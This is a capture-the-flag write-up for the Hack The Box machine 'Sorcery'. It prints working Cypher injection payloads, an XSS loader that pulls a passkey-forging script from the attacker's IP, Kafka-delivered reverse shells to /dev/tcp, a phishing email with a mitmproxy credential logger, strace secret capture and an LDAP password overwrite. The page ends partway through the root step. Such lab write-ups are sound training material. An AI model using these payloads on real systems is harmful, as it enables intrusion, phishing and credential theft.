---
icon: hat-witch
cover: ../../../../.gitbook/assets/Screenshot 2026-04-25 232700.png
coverY: 11.861251745340015
---

# HTB-SORCERY

<figure><img src="../../../../.gitbook/assets/Screenshot 2026-04-25 235403.png" alt=""><figcaption></figcaption></figure>

### What Even Is This Box About?

Let me give you the 30-second summary before we dive in. Sorcery runs a Rust Rocket web app backed by Neo4j, Gitea, Kafka, and a bunch of Docker containers. The attack chain is basically:

1. Cypher injection in a Rust macro-generated Neo4j query → leak seller registration key
2. Become a seller, use XSS in product descriptions to phish the admin bot → register a passkey on admin's account
3. As admin, the "debug port" tool is actually SSRF use it to send raw Kafka wire protocol messages → RCE in the DNS container
4. From DNS container, grab a CA keypair from FTP, phish `tom_summers` with mitmproxy → get SSH creds
5. Read a password from an Xvfb framebuffer → become `tom_summers_admin`
6. Reverse a .NET binary to generate OTPs → auth to Docker Registry → password leaked in image layer
7. FreeIPA role abuse via LDAP → change `ash_winter`'s password → exploit sudo rule management → root

Yeah, it's a lot. Let's go.

***

## Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>

#### Port Scan

```
┌──(sn0x㉿sn0x)-[~/HTB/Sorcery]
└─$ rustscan -a 10.10.11.73 --ulimit 5000 -- -sCV
```

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.11
443/tcp open  ssl/http nginx 1.27.1
| ssl-cert: Subject: commonName=sorcery.htb
|_http-title: Did not follow redirect to https://sorcery.htb/
```

Only two ports. SSH and HTTPS. The TLS cert gives us the domain `sorcery.htb` add it to `/etc/hosts`. Based on the OpenSSH version this is Ubuntu 24.04. Also worth noting when you traceroute port 443 you see an extra hop vs port 22, which hints the web app is actually inside a Docker container. That's going to matter later.

#### Vhost Discovery

```
┌──(sn0x㉿sn0x)-[~/HTB/Sorcery]
└─$ ffuf -u https://10.10.11.73 -H "Host: FUZZ.sorcery.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac
```

```
git     [Status: 200, Size: 13592, Words: 1048, Lines: 272]
```

Found `git.sorcery.htb`. Add that too. This is a Gitea instance — version 1.22.1 per the footer.

```
10.10.11.73   sorcery.htb git.sorcery.htb
```

***

### Website Enumeration - sorcery.htb

#### What We're Looking At

<figure><img src="../../../../.gitbook/assets/image (74).png" alt=""><figcaption></figcaption></figure>

Hit the site and you get a login form. Nothing crazy. There's a link pointing to `git.sorcery.htb/nicole_sullivan/infrastructure`. The registration form has an optional "Registration Key" field  that's interesting, means there's a tiered user system. Trying to register as `admin` fails with an error.

<figure><img src="../../../../.gitbook/assets/image (111).png" alt=""><figcaption></figcaption></figure>

Register any account and log in. You land on `/dashboard/store` with a bunch of products. The URL structure is `/dashboard/store/<GUID>` for individual products. Also, there's a "Profile" page showing your user ID, username, user type, and a button to enroll a passkey.

The response headers confirm this is a Next.js frontend:

```
X-Powered-By: Next.js
```

### Source Code - Gitea

Clone the repo:

```
┌──(sn0x㉿sn0x)-[~/HTB/Sorcery]
└─$ GIT_SSL_NO_VERIFY=1 git clone https://git.sorcery.htb/nicole_sullivan/infrastructure.git
```

There's a single commit. The repo has: `backend/`, `backend-macros/`, `dns/`, `frontend/`, and `docker-compose.yml`.

Reading `docker-compose.yml` tells us the entire infrastructure: Neo4j db, Kafka message bus, DNS container, MailHog (fake SMTP for dev), vsftpd (anonymous FTP with the CA key pair exposed!), Gitea, a mail\_bot, and nginx fronting everything. The critical insight here is that **all containers are on the same default Docker network with no isolation**  they can all talk to each other freely.

<figure><img src="../../../../.gitbook/assets/image (180).png" alt=""><figcaption></figcaption></figure>

#### Understanding the Backend

The backend is a Rust Rocket app. Key things from `main.rs` and the source:

**User privilege tiers:**

```rust
pub enum UserPrivilegeLevel {
    Client = 0,
    Seller = 1,
    Admin = 2,
}
```

Privilege level is NOT stored in Neo4j  it lives in a global in-memory `HashMap`. On boot, main.rs manually inserts the admin's privilege. This means you can't crack your way to admin by faking the DB  it's runtime state only.

**Registration key comparison in `api/auth/register.rs`:**

```rust
privilege_level: if registration_key.is_some()
    && &registration_key.unwrap() == REGISTRATION_KEY.get().await
{
    UserPrivilegeLevel::Seller
} else {
    UserPrivilegeLevel::Client
},
```

So if you know the registration key, you can register as a Seller. The key is stored as a `Config` node in Neo4j.

**The vulnerable macro in `backend-macros/src/lib.rs`:**

```rust
let query_string = format!(
    r#"MATCH (result: {} {{ {}: "{}" }}) RETURN result"#,
    #struct_name, #name_string, #name
);
```

The `id` parameter from the URL is string-concatenated directly into a Cypher query. **No escaping. No parameterization.** This is classic injection, just in Cypher (Neo4j's query language) instead of SQL. Why does this happen? The derive macro generates `get_by_id()` for every field using Rust's `format!()` macro and nobody sanitized the input before it hits this code path.

***

## Cypher Injection

#### Proof of Concept

Navigate to any product URL and add a `"` to the GUID  the page crashes with a 500. The closing quote breaks out of the Cypher string literal. That confirms injection.

For a working payload, the query generated by `Product::get_by_id(id)` looks like:

```cypher
MATCH (result: Product { id: "our-input-here" }) RETURN result
```

To inject, we need to close the string, close the property map `}`, close the MATCH parenthesis `)`, inject our own Cypher, and comment out the trailing `// }) RETURN result`.

The tricky bit: `from_row()` expects the result column aliased as `result` and typed as a `BoltMap`, and then `should_show_for_user()` checks `is_authorized`. So our injected return has to look exactly like a Product node with all fields present.

### Leak the Registration Key

The `Config` model in `db/connection.rs` has a `registration_key` field. Let's just grab it directly:

**Payload:**

```
x" }) RETURN result UNION ALL MATCH (c: Config) RETURN { id: "config", name: c.registration_key, description: "key", is_authorized: true, created_by_id: "x" } AS result //
```

URL-encode it and send as the product ID. The injected Cypher becomes:

```cypher
MATCH (result: Product { id: "x" }) RETURN result 
UNION ALL 
MATCH (c: Config) RETURN { id: "config", name: c.registration_key, description: "key", is_authorized: true, created_by_id: "x" } AS result 
//" }) RETURN result
```

The `UNION ALL` returns no rows from the first `MATCH` (no product with id "x") and one row from our injected query. The synthetic map has all required Product fields, `is_authorized: true` satisfies the visibility check, and the registration key appears in the product title on the rendered page.

```
Registration Key: dd05d743-b560-45dc-9a09-43ab18c7a513
```

**Why does UNION work here?** Cypher's UNION only requires matching column names between branches, not column types. So a map literal `{ ... }` happily unions with node results as long as the alias matches.

### Alternate Method - Read All Users + Hashes

Same technique, different query. To dump all users:

```
x" }) RETURN result UNION ALL MATCH (u: User) WITH reduce(s = "", x IN collect(u.username + ":" + u.password) | s + x + "<br>") AS desc RETURN { id: "u", name: "users", description: desc, is_authorized: true, created_by_id: "x" } AS result //
```

This gives you the admin's Argon2 hash. Argon2 doesn't crack easily against rockyou, so this path is mostly useful for the shortcut below.

#### Alternate Method (Shortcut) — Overwrite Admin Password

Instead of going through the XSS path, you can just SET the admin's password to something you know:

```
┌──(sn0x㉿sn0x)-[~/HTB/Sorcery]
└─$ python3 -c "from argon2 import PasswordHasher; print(PasswordHasher().hash('hacked123'))"
$argon2id$v=19$m=65536,t=3,p=4$...
```

Injection payload:

```
<real-product-uuid>" }) MATCH (u: User { username: "admin" }) SET u.password = "$argon2id$v=19$..." RETURN { id: "x", name: "done", description: "password changed", is_authorized: true, created_by_id: "x" } AS result //
```

This stacks a second query after the first MATCH using the real UUID (so the first MATCH succeeds and `from_row()` is happy), uses `SET` to overwrite the password, and returns a synthetic product. After this, you can log in as `admin` with your new password  skipping the whole XSS/passkey dance.

**Why does this work?** Neo4j Cypher allows multiple statements in one query separated by whitespace if you use the right query structure. There's no transaction isolation preventing the SET.

***

## Seller Access & XSS

#### Register as Seller

Use the leaked registration key when signing up:

Go to Register → fill in username/password → paste `dd05d743-b560-45dc-9a09-43ab18c7a513` in the Registration Key field. Now you're a Seller and get an "Add Product" option in the nav.

### XSS in Product Descriptions

From `frontend/src/app/dashboard/store/[product]/page.tsx`:

```tsx
<p
  className="mb-4 text-xl"
  dangerouslySetInnerHTML={{
    __html: product.description,
  }}
/>
```

`product.name` is rendered safely as a React child (escaped). `product.description` is shoved raw into `dangerouslySetInnerHTML`  no sanitization whatsoever. **Whatever HTML you put in the description renders as actual HTML in the browser, including script tags.**

Why does this matter? Because when a Seller submits a new product, the backend automatically fires up a headless Chrome instance, loads the product page with an **admin JWT cookie**, waits 10 seconds, then quits. Look at `api/product/insert.rs`:

```rust
let claim = UserClaims {
    id: user.id,
    username: user.username.to_owned(),
    privilege_level: user.privilege_level,
    with_passkey: true,
    only_for_paths: Some(vec![
        r"^\/api\/product\/[a-zA-Z0-9-]+$".to_string(),
        r"^\/api\/webauthn\/passkey\/register\/start$".to_string(),
        r"^\/api\/webauthn\/passkey\/register\/finish$".to_string(),
    ]),
    ...
};
```

The admin token minted here is scoped to only three endpoint patterns: product viewing, and passkey registration (start + finish). **Passkey registration.** That's the window we need.

### XSS Payload - Register a Passkey on Admin's Account

The idea: our XSS code runs inside the bot's Chrome with the admin cookie. We call the Next.js `startRegistration` server action (same-origin, so the admin cookie attaches automatically), get back a WebAuthn challenge, send it to our server which generates a fake ECDSA keypair and constructs a valid attestation, then call `finishRegistration` with the forged credential.

First, find the Next.js server action IDs by watching your own passkey enrollment in Burp:

```
Start registration action:  062f18334e477c66c7bf63928ee38e241132fabc
Finish registration action: 60971a2b6b26a212882926296f31a1c6d7373dfa
```

These are deterministic build-time hashes - they don't rotate.

**XSS payload in product description:**

```html
<img src=http://10.10.14.61/x.jpg onerror="var s=document.createElement('script');s.src='http://10.10.14.61/passkey.js';document.head.appendChild(s)">
```

**`passkey.js`** - three-step flow:

```javascript
(async () => {
    const SERVER = 'http://10.10.14.61';
    const START_ACTION = '062f18334e477c66c7bf63928ee38e241132fabc';
    const FINISH_ACTION = '60971a2b6b26a212882926296f31a1c6d7373dfa';

    // Step 1: trigger startRegistration server action (admin cookie attaches automatically)
    const startResp = await fetch('/dashboard/profile', {
        method: 'POST',
        body: '[]',
        headers: {
            'Next-Action': START_ACTION,
            'Content-Type': 'text/plain;charset=UTF-8',
        },
    });
    const startText = await startResp.text();
    const challengeJson = JSON.parse(startText.split('\n')[1].substring(2));
    const challenge = challengeJson.result.challenge;

    // Step 2: send challenge to our server, get a fake credential back
    const solveResp = await fetch(SERVER + '/solve', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            challenge: challenge.publicKey.challenge,
            rp: challenge.publicKey.rp,
        }),
    });
    const credential = await solveResp.json();

    // Step 3: finishRegistration with our forged credential
    await fetch('/dashboard/profile', {
        method: 'POST',
        body: JSON.stringify([credential]),
        headers: {
            'Next-Action': FINISH_ACTION,
            'Content-Type': 'text/plain;charset=UTF-8',
        },
    });

    new Image().src = SERVER + '/done';
})();
```

The Flask server (`pk_server.py`) handles `/solve` by:

1. Generating a fresh ECDSA P-256 keypair
2. Building a CBOR-encoded COSE key
3. Constructing the `authData` blob with the right flags (UP|UV|AT = `0x45`)
4. Returning a `RegistrationResponseJSON` with forged `attestationObject` and `clientDataJSON`

**Critical flag detail:** The UV bit (User Verified = `0x04`) MUST be set in `authData`. `webauthn_rs` requires user verification for passkey registration (`userVerification: "required"`). Using `0x41` instead of `0x45` silently fails registration. This took iteration to figure out.

The `clientDataJSON` must set `origin` to `https://sorcery.htb` regardless of what origin the bot is actually running from (`http://frontend:3000`). We're constructing this JSON ourselves on our server.

CORS headers needed on the Flask server because the bot's fetch to `/solve` is cross-origin.

When the bot hits `/done`, our server immediately performs the passkey authentication flow for `admin`:

```
[+] Credential ID: X1clb0t5Fszggz772wsRjQL4A7LDnkaSsH9SJnH7LRk
[+] ADMIN JWT:
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...
```

Set this as the `token` cookie on `sorcery.htb`. You're now admin with a passkey-backed session, which unlocks DNS, Debug, and Blog pages.

***

## RCE via Kafka (SSRF → Command Injection)

#### Understanding the Attack Surface

As admin with a passkey session, the Debug page at `/dashboard/debug` lets you:

* Specify any `host:port`
* Send hex-encoded data
* Optionally receive a response

From `api/debug/debug.rs`:

```rust
let Ok(mut stream) = TcpStream::connect(format!("{}:{}", data.host, data.port)) else {
    return Err(AppError::NotFound);
};
// ... hex decode and write to socket
```

No allowlist. No filtering. The backend can reach any container on the Docker network. This is pure SSRF with arbitrary TCP data sending capability.

Now, from `dns/src/main.rs`, the DNS container subscribes to the Kafka topic `update` and does this:

```rust
let mut process = match Command::new("bash").arg("-c").arg(command).spawn() {
```

The message body goes straight into `bash -c`. Zero filtering. So if we can send a Kafka `Produce` message to `kafka:9092` on the `update` topic, we get RCE as the `user` account inside the DNS container.

#### Building the Kafka Wire Protocol Payload

Kafka doesn't speak plain text  you need to send a proper binary Kafka protocol message. We need to craft a valid v0 Produce request:

```
[4-byte total size][request header][produce body]

Request header: api_key(2=Produce) + api_version(2=0) + correlation_id(4) + client_id(2+N)
Produce body:   required_acks(2) + timeout(4) + topic_count(4) +
                  topic_name(2+N) + partition_count(4) +
                    partition_id(4) + message_set_size(4) +
                      offset(8) + message_size(4) +
                        crc(4) + magic(1=0) + attributes(1=0) + key_len(4=-1/null) + value_len(4) + value
```

**Python script to generate the hex payload:**

```python
import binascii, struct, sys

def kafka_produce_hex(topic, message):
    value = message.encode()
    # Message v0 body
    msg_body = struct.pack('>bb', 0, 0)       # magic=0, attributes=0
    msg_body += struct.pack('>i', -1)          # key = null
    msg_body += struct.pack('>i', len(value)) + value
    crc = binascii.crc32(msg_body) & 0xffffffff
    full_msg = struct.pack('>I', crc) + msg_body

    # MessageSet: offset=0
    msg_set = struct.pack('>q', 0) + struct.pack('>i', len(full_msg)) + full_msg

    # Partition 0
    partition = struct.pack('>i', 0) + struct.pack('>i', len(msg_set)) + msg_set

    # Topic
    topic_b = topic.encode()
    topic_data = struct.pack('>h', len(topic_b)) + topic_b
    topic_data += struct.pack('>i', 1) + partition

    # Produce request body: acks=1, timeout=5000, 1 topic
    body = struct.pack('>hi', 1, 5000) + struct.pack('>i', 1) + topic_data

    # Header: api_key=0 (Produce), api_version=0, correlation_id=1, client_id="sn0x"
    client = b'sn0x'
    header = struct.pack('>hhi', 0, 0, 1) + struct.pack('>h', len(client)) + client

    request = header + body
    return (struct.pack('>i', len(request)) + request).hex()

print(kafka_produce_hex("update", sys.argv[1]))
```

**Alternate method to get the payload:** Use `kcat` (kafkacat) with its `--mock` server feature. Start a mock Kafka broker locally, connect with kcat to produce a message, capture the traffic with `tcpdump`, then extract the exact bytes from the Wireshark TCP stream. This is cleaner if you don't want to manually implement the protocol.

```
┌──(sn0x㉿sn0x)-[~/HTB/Sorcery]
└─$ kcat -M 1
% Mock cluster started with bootstrap.servers=127.0.0.1:44819

# in another terminal
┌──(sn0x㉿sn0x)-[~/HTB/Sorcery]
└─$ echo -n 'bash -c "/bin/sh -i >& /dev/tcp/10.10.14.61/443 0>&1"' | kcat -P -t update -b 127.0.0.1:44819

# capture with tcpdump
┌──(sn0x㉿sn0x)-[~/HTB/Sorcery]
└─$ sudo tcpdump -i any port 44819 -w kafka.pcap
```

Then open in Wireshark, follow the TCP stream from client → server, extract the hex.

### Trigger RCE

Generate the payload:

```
┌──(sn0x㉿sn0x)-[~/HTB/Sorcery]
└─$ python3 kafka_produce.py 'bash -i >& /dev/tcp/10.10.14.61/443 0>&1'
0000006e000000000000000100047...
```

Paste that hex into the Debug form, target `kafka:9092`, send it. Start your listener:

```
┌──(sn0x㉿sn0x)-[~/HTB/Sorcery]
└─$ nc -lvnp 443
```

```
Connection received on 10.10.11.73
bash: /root/.bashrc: Permission denied
user@7bfb70ee5b9c:/app$
```

We're inside the DNS container as `user`.

Upgrade the shell:

```
user@7bfb70ee5b9c:/app$ script /dev/null -c bash
^Z
stty raw -echo; fg
reset
Terminal type? screen
```

***

## From DNS Container to Host (Phishing tom\_summers)

#### What We Know

From the blog posts seeded in the DB during initial setup:

* `tom_summers` fell for a Gitea phishing test and had their credentials reset meaning they WILL click phishing links
* Users are told to only trust links from `*.sorcery.htb`, using HTTPS, with certs signed by the internal CA
* The CA private key is on the FTP server (`RootCA.key`) anonymously accessible

The DNS container has direct network access to all other containers. We can:

1. Download the CA keypair from FTP
2. Create a DNS record pointing a new subdomain to our machine
3. Sign a TLS cert with the CA key
4. Run mitmproxy to intercept the Gitea login
5. Email `tom_summers` a link to our fake Gitea page

### Grab the CA Keypair from FTP

```
user@7bfb70ee5b9c:/$ python3 -c 'import ftplib; ftp=ftplib.FTP("ftp"); ftp.login(); ftp.cwd("pub"); ftp.retrbinary("RETR RootCA.crt", open("/tmp/RootCA.crt","wb").write)'
user@7bfb70ee5b9c:/$ python3 -c 'import ftplib; ftp=ftplib.FTP("ftp"); ftp.login(); ftp.cwd("pub"); ftp.retrbinary("RETR RootCA.key", open("/tmp/RootCA.key","wb").write)'
```

The private key has `-----BEGIN ENCRYPTED PRIVATE KEY-----`  it's passphrase-protected. Crack it:

```
┌──(sn0x㉿sn0x)-[~/HTB/Sorcery]
└─$ /opt/john/run/pem2john.py RootCA.key | cut -d'$' -f1-3,7- > RootCA.key.hash
┌──(sn0x㉿sn0x)-[~/HTB/Sorcery]
└─$ hashcat RootCA.key.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

Mode auto-detected as `24420` (PKCS#8 Private Keys, PBKDF2-HMAC-SHA256 + AES). Cracks to: `password`.

Decrypt the key:

```
┌──(sn0x㉿sn0x)-[~/HTB/Sorcery]
└─$ openssl rsa -in RootCA.key -out RootCA-dec.key
Enter pass phrase for RootCA.key: password
```

**Why hashcat mode 24420?** The header `BEGIN ENCRYPTED PRIVATE KEY` signals PKCS#8 encoding. The specific hash format from `pem2john.py` includes the KDF algorithm (PBKDF2-HMAC-SHA256), iteration count, salt, and the encrypted blob  hashcat 24420 handles exactly this combination.

### Set a DNS Record

The dnsmasq in the DNS container reads from `/dns/hosts` (root-owned) and `/dns/hosts-user` (user-writable directory). Create the user hosts file and restart dnsmasq:

```
user@7bfb70ee5b9c:/dns$ echo "10.10.14.61 phishing.sorcery.htb" > hosts-user
user@7bfb70ee5b9c:/dns$ killall dnsmasq
user@7bfb70ee5b9c:/dns$ /usr/sbin/dnsmasq --no-daemon --addn-hosts /dns/hosts-user --addn-hosts /dns/hosts &
```

Verify:

```
user@7bfb70ee5b9c:/dns$ dig @localhost phishing.sorcery.htb +short
10.10.14.61
```

### Create a Signed TLS Cert

```
┌──(sn0x㉿sn0x)-[~/HTB/Sorcery]
└─$ openssl genrsa -out phishing.key 2048
┌──(sn0x㉿sn0x)-[~/HTB/Sorcery]
└─$ openssl x509 -req \
    -in <(openssl req -new -key phishing.key -subj '/CN=phishing.sorcery.htb') \
    -CA RootCA.crt \
    -CAkey RootCA-dec.key \
    -CAcreateserial \
    -out phishing.crt \
    -days 365
┌──(sn0x㉿sn0x)-[~/HTB/Sorcery]
└─$ cat phishing.crt phishing.key > phishing.pem
```

This cert will be trusted by the mail bot because it's signed by the internal CA. That's the exact condition in the blog post: "uses our root CA".

#### Run mitmproxy

Set `phishing.sorcery.htb` → `127.0.0.1` in your local `/etc/hosts`, then:

```
┌──(sn0x㉿sn0x)-[~/HTB/Sorcery]
└─$ mitmdump --mode reverse:https://git.sorcery.htb/ -p 443 --ssl-insecure --certs '*=phishing.pem' -q -s phish_log.py
```

**`phish_log.py`:**

```python
from mitmproxy import http
from urllib.parse import parse_qs

SKIP = ('.css', '.js', '.png', '.svg', '.ico')

def request(flow):
    path = flow.request.path.split('?')[0]
    if path.endswith(SKIP): return
    print(f">> {flow.request.method} {flow.request.pretty_url}")
    if flow.request.method == "POST":
        for k, v in parse_qs(flow.request.get_text()).items():
            print(f"   {k}: {v[0]}")
```

### Send the Phishing Email

From the DNS container (which can reach `mail:1025`):

```
user@7bfb70ee5b9c:/$ python3 - << 'EOF'
import smtplib
from email.mime.text import MIMEText
msg = MIMEText('<a href="https://phishing.sorcery.htb/user/login">Verify your Gitea account</a>', 'html')
msg["Subject"] = "Action required: Verify your Gitea account"
msg["From"] = "admin@sorcery.htb"
msg["To"] = "tom_summers@sorcery.htb"
s = smtplib.SMTP("mail", 1025)
s.send_message(msg)
s.quit()
print("Sent!")
EOF
```

The mail bot checks the inbox on an interval, follows the link (because it meets all three criteria: sorcery.htb subdomain, HTTPS, signed by internal CA), gets redirected to the Gitea login page, fills in credentials, and sends them:

```
>> POST https://git.sorcery.htb/user/login
   _csrf: OfHkh4InJ-RonHNAaEkMiMVaCYk6...
   user_name: tom_summers
   password: jNsMKQ6k2.XDMPu.
```

The 200 response (not a redirect) means Gitea rejected the creds consistent with the blog saying the infosec team already reset the password after the last phish. But these are the real credentials.

### SSH as tom\_summers

```
┌──(sn0x㉿sn0x)-[~/HTB/Sorcery]
└─$ ssh tom_summers@10.10.11.73
tom_summers@main:~$ 
```

***

## Lateral Movement: tom\_summers → tom\_summers\_admin

#### What's Running

```
tom_summers@main:~$ ps auxww | grep tom_summers_admin
tom_sum+  1475  /usr/bin/mousepad /provision/cron/tom_summers_admin/passwords.txt
tom_sum+  1477  /usr/bin/Xvfb :1 -fbdir /xorg/xvfb -screen 0 512x256x24 -nolisten local
```

`tom_summers_admin` is running `mousepad` (a GUI text editor) with a file called `passwords.txt`, and `Xvfb` (X Virtual FrameBuffer) with the framebuffer dumped to `/xorg/xvfb/Xvfb_screen0`. Xvfb writes the raw screen contents to a file on disk. The file is world-readable:

```
tom_summers@main:/xorg/xvfb$ ls -la
-rwxr--r-- 1 tom_summers_admin tom_summers_admin 527520 Xvfb_screen0
```

#### Read the Screen

```
┌──(sn0x㉿sn0x)-[~/HTB/Sorcery]
└─$ scp tom_summers@10.10.11.73:/xorg/xvfb/Xvfb_screen0 .
```

Convert the raw framebuffer (512x256x24, X-Window dump format) to a viewable image. Using ImageMagick:

```
┌──(sn0x㉿sn0x)-[~/HTB/Sorcery]
└─$ convert xwd:Xvfb_screen0 screen.png
```

Or with Python Pillow if you want:

```python
from PIL import Image
width, height = 512, 256
with open("Xvfb_screen0", "rb") as f:
    # X-Window dump has a header before the raw pixels — skip ~800 bytes
    f.seek(800)
    raw = f.read(width * height * 4)
img = Image.frombuffer("RGB", (width, height), raw, "raw", "BGRX", 0, 1)
img.save("screen.png")
```

The rendered image shows the Mousepad editor open with `passwords.txt`. Read the password: `dWpuk7cesBjT-`.

```
tom_summers@main:~$ su - tom_summers_admin
Password: dWpuk7cesBjT-
tom_summers_admin@main:~$
```

***

## Lateral Movement: tom\_summers\_admin → rebecca\_smith → donna\_adams

#### Sudo Privileges

```
tom_summers_admin@main:~$ sudo -l
(rebecca_smith) NOPASSWD: /usr/bin/docker login
(rebecca_smith) NOPASSWD: /usr/bin/strace -s 128 -p [0-9]*
```

Two sudo rules. `docker login` triggers the custom credential helper `docker-credential-docker-auth`. `strace` lets us trace any process running as `rebecca_smith`.

#### Getting the Docker Registry Password (via strace)

When you run `sudo -u rebecca_smith docker login`, pspy shows it calls `docker-credential-docker-auth get` and then `docker-credential-docker-auth store`. We can attach strace to the `get` invocation.

**Catch script:**

```bash
#!/usr/bin/env bash
seen=()
while true; do
    pids=$(pgrep -f docker-credential-docker-auth)
    [[ -z $pids ]] && continue
    while read -r pid; do
        [[ " ${seen[@]} " =~ " ${pid} " ]] && continue
        echo "Attaching to $pid"
        sudo -u rebecca_smith /usr/bin/strace -s 128 -p "$pid" -o /tmp/trace_$pid.log &
        seen+=("$pid")
    done <<< "$pids"
done
```

Run this in one terminal, then in another:

```
tom_summers_admin@main:~$ sudo -u rebecca_smith /usr/bin/docker login
```

Check the trace:

```
grep 'write(33' /tmp/trace_*.log
write(33, "{\"Username\":\"rebecca_smith\",\"Secret\":\"-7eAZDp9-f9mg\"}\n", 54) = 54
```

Password for rebecca\_smith: `-7eAZDp9-f9mg`

The output also says "In case login fails, try logging in with `<password><otp>`" — so there's a 6-digit OTP suffix.

### Reversing the OTP - the .NET Binary

```
┌──(sn0x㉿sn0x)-[~/HTB/Sorcery]
└─$ scp tom_summers_admin@10.10.11.73:/usr/bin/docker-credential-docker-auth .
┌──(sn0x㉿sn0x)-[~/HTB/Sorcery]
└─$ file docker-credential-docker-auth
ELF 64-bit ... stripped
```

`strings` shows `.NETCoreApp,Version=v8.0` — it's a self-contained .NET 8 binary. Open in DotPeek (or ILSpy on Linux):

Decompiled `HandleOtp`:

```csharp
static void HandleOtp(object dynamicArgs)
{
    new Random(DateTime.Now.Minute / 10 + (int) GetCurrentExecutableOwner().UserId).Next(100000, 999999);
    Console.WriteLine("OTP is currently experimental. Please ask our admins for one");
}
```

The function creates a `Random` seeded with `(current_minute / 10) + owner_uid` and calls `Next(100000, 999999)`. **But it never stores the result in a variable and just discards it.** The OTP feature is broken  it was intentionally left unimplemented. However, we can replicate the algorithm.

`rebecca_smith`'s UID: `2003` (from `id` or `/etc/passwd`). `DateTime.Now.Minute / 10` gives values 0–5 for minute ranges 00–09, 10–19, etc.

So there are only **6 possible OTPs** total, cycling every 10 minutes.

**.NET's `System.Random` with a fixed seed is deterministic** same seed always produces the same sequence. We just need to port it:

**Python port of .NET's Knuth subtractive RNG:**

```python
MBIG = 2147483647
MSEED = 161803398

class DotNetRandom:
    def __init__(self, seed):
        sa = [0] * 56
        subtraction = MBIG if seed == -2147483648 else abs(seed)
        mj = MSEED - subtraction
        sa[55] = mj
        mk = 1
        for i in range(1, 55):
            ii = (21 * i) % 55
            sa[ii] = mk
            mk = mj - mk
            if mk < 0: mk += MBIG
            mj = sa[ii]
        for _ in range(1, 5):
            for i in range(1, 56):
                sa[i] -= sa[1 + (i + 30) % 55]
                if sa[i] < 0: sa[i] += MBIG
        self.sa = sa
        self.inext = 0
        self.inextp = 21

    def _sample(self):
        self.inext = 1 if self.inext + 1 >= 56 else self.inext + 1
        self.inextp = 1 if self.inextp + 1 >= 56 else self.inextp + 1
        r = self.sa[self.inext] - self.sa[self.inextp]
        if r == MBIG: r -= 1
        if r < 0: r += MBIG
        self.sa[self.inext] = r
        return r * (1.0 / MBIG)

    def next(self, lo, hi):
        return int(self._sample() * (hi - lo)) + lo

uid = 2003
for block in range(6):
    otp = DotNetRandom(block + uid).next(100000, 999999)
    print(f"min {block*10:02d}-{block*10+9:02d}: {otp}")
```

Output:

```
min 00-09: 229732
min 10-19: 699914
min 20-29: 270098
min 30-39: 740280
min 40-49: 310463
min 50-59: 780645
```

**Alternate method:** Just write a tiny .NET console app on your box:

```csharp
for (int i = 0; i < 6; i++) {
    Console.WriteLine($"{i*10:00}-{i*10+9:00}: {new Random(i + 2003).Next(100000, 999999)}");
}
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Sorcery]
└─$ dotnet run --project recover_otp/
```

Same results.

### Authenticate to Docker Registry

Check current minute, pick the right OTP, concatenate with the password:

```
tom_summers_admin@main:~$ curl -u 'rebecca_smith:-7eAZDp9-f9mg270098' localhost:5000/v2/
{}
```

200 OK  we're in.

### Enumerate the Registry

```
tom_summers_admin@main:~$ curl -u 'rebecca_smith:-7eAZDp9-f9mg270098' localhost:5000/v2/_catalog
{"repositories":["test-domain-workstation"]}
```

Set up SSH tunnel so we can use tools from our box:

```
┌──(sn0x㉿sn0x)-[~/HTB/Sorcery]
└─$ ssh -L 5000:127.0.0.1:5000 tom_summers_admin@10.10.11.73 -N &
```

Dump image layers with DockerRegistryGrabber:

```
┌──(sn0x㉿sn0x)-[~/HTB/Sorcery]
└─$ python drg.py http://localhost --dump test-domain-workstation -U 'rebecca_smith' -P '-7eAZDp9-f9mg270098'
[+] Downloading : 292e59a87dfb0fb3787c3889e4c1b81bfef0cd2f3378c61f281a4c7a02ad1787
[snip]
```

Extract the small layer:

```
┌──(sn0x㉿sn0x)-[~/HTB/Sorcery]
└─$ tar -xf 292e59a87dfb0fb3787c3889e4c1b81bfef0cd2f3378c61f281a4c7a02ad1787.tar.gz
┌──(sn0x㉿sn0x)-[~/HTB/Sorcery]
└─$ cat docker-entrypoint.sh
#!/bin/bash
ipa-client-install --unattended --principal donna_adams --password 3FEVPCT_c3xDH \
    --server dc01.sorcery.htb --domain sorcery.htb --no-ntp --force-join --mkhomedir
```

Credentials: `donna_adams:3FEVPCT_c3xDH`

```
┌──(sn0x㉿sn0x)-[~/HTB/Sorcery]
└─$ ssh donna_adams@10.10.11.73
Creating directory '/home/donna_adams'.
donna_adams@main:~$
```

***

## Privilege Escalation via FreeIPA

#### The Identity Stack

This machine is joined to a FreeIPA domain. You can confirm by reading `/etc/ipa/default.conf`:

```
realm = SORCERY.HTB
server = dc01.sorcery.htb
```

And `donna_adams` already has a Kerberos ticket from the SSH login:

```
donna_adams@main:~$ klist
Default principal: donna_adams@SORCERY.HTB
krbtgt/SORCERY.HTB@SORCERY.HTB — valid
```

#### Enumerate IPA Users and Roles

```
donna_adams@main:~$ ipa user-show donna_adams
  Indirect Member of role: change_userPassword_ash_winter_ldap
```

```
donna_adams@main:~$ ipa user-show ash_winter
  Indirect Member of role: add_sysadmin
```

The role names are basically the attack chain spelled out. `donna_adams` can change `ash_winter`'s password. `ash_winter` can add users to the `sysadmins` group.

#### Why Can't We Just Use `ipa passwd`?

The role grants `donna_adams` write access to the `userPassword` LDAP attribute  not the right to use the IPA password-change extended operation. `ipa passwd ash_winter` would use the higher-level IPA API which respects different ACLs. Direct `ldapmodify` writing the attribute directly works:

```
donna_adams@main:~$ ldapmodify -Y GSSAPI -H ldap://dc01.sorcery.htb <<EOF
dn: uid=ash_winter,cn=users,cn=accounts,dc=sorcery,dc=htb
changetype: modify
replace: userPassword
userPassword: Hacked123!
EOF
SASL/GSSAPI authentication started
modifying entry "uid=ash_winter,cn=users,cn=accounts,dc=sorcery,dc=htb"
```

**Alternate:** `ipa user-mod ash_winter --setattr userPassword=Hacked123!` also works here since the role permits writing the attribute via the IPA API too in this case. Or `ipa user-mod ash_winter --password` for an interactive prompt.

SSH as `ash_winter`  password is expired so you'll be forced to change it on first login:

```
